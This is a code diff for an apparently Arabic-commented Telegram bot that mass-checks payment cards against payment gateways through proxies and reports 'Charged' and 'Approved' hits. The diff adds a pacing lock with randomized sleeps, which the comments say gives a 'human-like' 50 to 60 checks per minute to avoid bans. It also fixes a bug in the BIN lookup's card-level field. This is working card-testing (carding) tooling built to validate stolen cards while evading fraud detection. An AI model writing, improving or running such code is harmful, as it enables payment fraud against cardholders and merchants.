@@ -93,7 +93,7 @@ KEYS_FILE = "redeem_keys.json"
 
 # التعديلات المطلوبة
 WORKERS = 40  
-DELAY = 15  
+DELAY = 14  
 HIT_DELAY = 1.0
 API_TIMEOUT = 60
 
@@ -260,10 +260,9 @@ COUNTRY_NAME_TO_CODE = {
     "MONTSERRAT": "MS", "MOROCCO": "MA", "MOZAMBIQUE": "MZ", "MYANMAR": "MM", "NAMIBIA": "NA", "NAURU": "NR",
     "NEPAL": "NP", "NETHERLANDS": "NL", "NETHERLANDS ANTILLES": "AN", "NEW CALEDONIA": "NC", "NEW ZEALAND": "NZ",
     "NICARAGUA": "NI", "NIGER": "NE", "NIGERIA": "NG", "NIUE": "NU", "NORFOLK ISLAND": "NF", "NORTHERN MARIANA ISLANDS": "MP",
-    "NORWAY": "NO", "OMAN": "OM", "PAKISTAN": "PK", "PALAU": "PW", "PALESTINIAN TERRITORY, OCCUPIED": "PS",
-    "PALESTINE": "PS", "PANAMA": "PA", "PAPUA NEW GUINEA": "PG", "PARAGUAY": "PY", "PERU": "PE",
-    "PHILIPPINES": "PH", "PITCAIRN": "PN", "POLAND": "PL", "PORTUGAL": "PT", "PUERTO RICO": "PR",
-    "QATAR": "QA", "REUNION": "RE", "ROMANIA": "RO", "RUSSIAN FEDERATION": "RU", "RUSSIA": "RU",
+    "NORWAY": "NO", "OMAN": "OM", "PAKISTAN": "PK", "PANAMA": "PA", "PCN": "PN", "PERU": "PE",
+    "PHL": "PH", "PLW": "PW", "PNG": "PG", "POLAND": "PL", "PRI": "PR", "PRK": "KP", "PRT": "PT", "PRY": "PY",
+    "PSE": "PS", "PYF": "PF", "QAT": "QA", "REUNION": "RE", "ROMANIA": "RO", "RUSSIAN FEDERATION": "RU", "RUSSIA": "RU",
     "RWANDA": "RW", "SAINT HELENA": "SH", "SAINT KITTS AND NEVIS": "KN", "SAINT LUCIA": "LC",
     "SAINT PIERRE AND MIQUELON": "PM", "SAINT VINCENT AND THE GRENADINES": "VC", "SAMOA": "WS",
     "SAN MARINO": "SM", "SAO TOME AND PRINCIPE": "ST", "SAUDI ARABIA": "SA", "SENEGAL": "SN",
@@ -665,7 +664,7 @@ async def get_bin_info(bin_code, session=None):
             parsed = clean_bin_data({
                 "brand": res.get("brand", "-"),
                 "type": res.get("type", "-"),
-                "level": res.get("brand", "-"),
+                "level": res.get("level", "-"),
                 "bank": res.get("bank", "-"),
                 "country": res.get("country_name", res.get("country", "-")),
                 "country_code": res.get("country_flag", res.get("country_code", res.get("country_iso", ""))),
@@ -1532,6 +1531,9 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
 
     current_workers = 1 if gate_name == "AuthNet" else WORKERS
 
+    # قفل التوازن المتسلسل (Sequential Pacing Lock) للتحكم بالـ CPM بدقة بالغة
+    pacing_lock = asyncio.Lock()
+
     async def dashboard_updater():
         while not is_stopped():
             for _ in range(20):
@@ -1564,49 +1566,52 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     sem = asyncio.Semaphore(current_workers)
 
     async def worker(wid):
-        await asyncio.sleep(wid * 0.05)
+        await asyncio.sleep(wid * 0.02)
         nonlocal chk, chg, app, ins, dec, err, last_resp
         while not queue.empty() and not is_stopped():
             try: card = queue.get_nowait()
             except Exception: break
             async with sem:
                 try:
+                    # محرك تنظيم التدفق المتسلسل: يفرض فاصلاً زمنياً بين كل بطاقة وأخرى لثبات الـ CPM حوالي 50-60
+                    async with pacing_lock:
+                        if not is_stopped():
+                            # النوم 1.0 إلى 1.25 يعطينا بدقة متناهية من 50 إلى 60 طلب في الدقيقة بشكل مريح وبشري
+                            await asyncio.sleep(random.uniform(1.0, 1.25))
+                    
+                    if is_stopped(): break
+                    
                     c_st = time.time()
                     res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, uid, max_retries=6)
                     if is_stopped(): break 
                     c_el = time.time() - c_st
                     status = res.get('status', 'Dead')
                     
-                    # نظام التجاهل والاعتدال الصامت لأخطاء البوابات
                     if status == 'Site Error':
-                        chk += 1  # يضاف للإجمالي الكلي لضمان اكتمال فحص الملف بدون تعليق
-                        # تم إزالة أمر continue لكي تمر البطاقة على كود الانتظار (Sleep) أدناه طبيعياً ولا يقفز البوت بجنون
-                    else:
                         chk += 1
-                        raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
-                        last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
+                        continue
                         
-                        if status == 'Charged':
-                            chg += 1
-                            asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
-                        elif status == 'Approved': 
-                            app += 1
-                        elif status == 'Insufficient': 
-                            ins += 1
-                        else: 
-                            dec += 1
+                    chk += 1
+                    raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
+                    last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
+                    
+                    if status == 'Charged':
+                        chg += 1
+                        asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
+                    elif status == 'Approved': 
+                        app += 1
+                    elif status == 'Insufficient': 
+                        ins += 1
+                    else: 
+                        dec += 1
                 except asyncio.CancelledError: break
                 except Exception: 
                     chk += 1
                 finally:
                     queue.task_done()
-                    
-            # نظام الاتزان والاعتدال التلقائي (Pacing) لضمان الفحص الدقيق والواقعي ومنع الحظر
-            if not is_stopped(): 
-                if gate_name == "AuthNet":
-                    await asyncio.sleep(random.uniform(1.0, 2.0)) 
-                else:
-                    await asyncio.sleep(random.uniform(2.0, 4.0))
+            
+            # مجرد تسليم بسيط لـ loop دون أي تأخير تعسفي إضافي لأن التوازن يحدث في pacing_lock بالأعلى
+            await asyncio.sleep(0.01)
 
     wt = [asyncio.create_task(worker(i)) for i in range(current_workers)]
     process_store[uid]["tasks"] = wt + [ut]
